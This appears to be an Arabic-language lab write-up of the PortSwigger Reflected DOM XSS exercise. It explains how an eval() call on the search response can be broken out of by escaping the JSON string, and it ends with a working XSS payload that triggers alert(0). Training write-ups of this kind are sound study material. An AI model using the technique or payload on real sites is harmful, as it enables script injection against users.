### 1️⃣ معلومات عامة

|العنصر|التفاصيل|
|---|---|
|**رابط اللاب**|[Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)|
|**تاريخ الحل**|29 / 4 / 2025|
|**نوع الثغرة**|Reflected DOM XSS|

---
### 2️⃣ فهم سيناريو اللاب

- الموقع يحتوي على خانة **بحث**.

- عند كتابة أي كلمة والضغط على **Search**، يتم **عرض الكلمة** داخل صفحة النتائج.

![[Pasted image 20250429183843.png]]

---

### 3️⃣ تحليل الكود المصدر (Source Code)

- بصيت على الـ source code وملقتش حاجة.
    
- ففتحت Burp Suite وبعت الطلب ودا اللي ظهر:
    

![[Pasted image 20250429184917.png]]

- لكن لما بصيت تاني لقيت فيه **رد إضافي**، وكان فيه الكود الخطر دا:
    

```js
if (this.readyState == 4 && this.status == 200) {
  eval('var searchResultsObj = ' + this.responseText);
  displaySearchResults(searchResultsObj);
}
```

- الكود بياخد الرد من السيرفر ويحطه في دالة `eval()`، اللي بتتعامل مع أي input كأنه كود JavaScript وبتنفذه.
    

![[Pasted image 20250429185440.png]]

---

### 4️⃣ تحليل طريقة الاستغلال

#### ❗ المشكلة:

الرد من السيرفر بيكون كدا:

```json
{
  "results": [],
  "searchTerm": "z3rob"
}
```

ولو حطينا كود داخل `searchTerm`، هيتعامل كـ string ومش هيتنفذ كـ JavaScript.

---

### ✅ الحل: نكسر بناء الـ JSON

#### الخطوة 1️⃣: نحاول نخرج من الـ string

جربنا نحط:

```
results?search=z3rob"
```

وكان الرد:

```json
{
  "results": [],
  "searchTerm": "z3rob\""
}
```

- الرد أضاف `\` علشان يمنع كسر السلسلة.
    

##### ➤ الحل:

نضيف `\` إحنا كمان، فيصبح كدا:

```
results?search=z3rob\\"
```

فيرد السيرفر:

```json
{
  "results": [],
  "searchTerm": "z3rob\\\""
}
```

نجحنا في كسر تسلسل الـ string.

---

#### الخطوة 2️⃣: نحاول نخرج من الـ JSON كله ونضيف JavaScript

جربنا نحط:

```
z3rob\\""}alert(0)//
```

لكن الكود **مشتغلش**.

---

### ❓ سؤال: **ليه الكود مشتغلش؟**

```js
z3rob\\""}alert(0)//
```

👆 الكود ده مشتغلش لأننا **نسينا نحط فاصلة منقوطة `;`**.

### ✅ التفسير:

- لازم الكود اللي داخل `eval()` يكون صحيح نحويًا.
    
- بدون `;`، المتصفح ممكن يربط `alert(0)` بالجملة اللي قبلها، وده يسبب خطأ.
    

---

### ✔️ الحل النهائي (Final Payload)

```js
z3rob\"};alert(0)//
```

✅ وتم تنفيذ الـ `alert(0)` بنجاح!

![[Pasted image 20250429191855.png]]

---

هل تحب أحول لك الملاحظات دي لملف Markdown أو PDF؟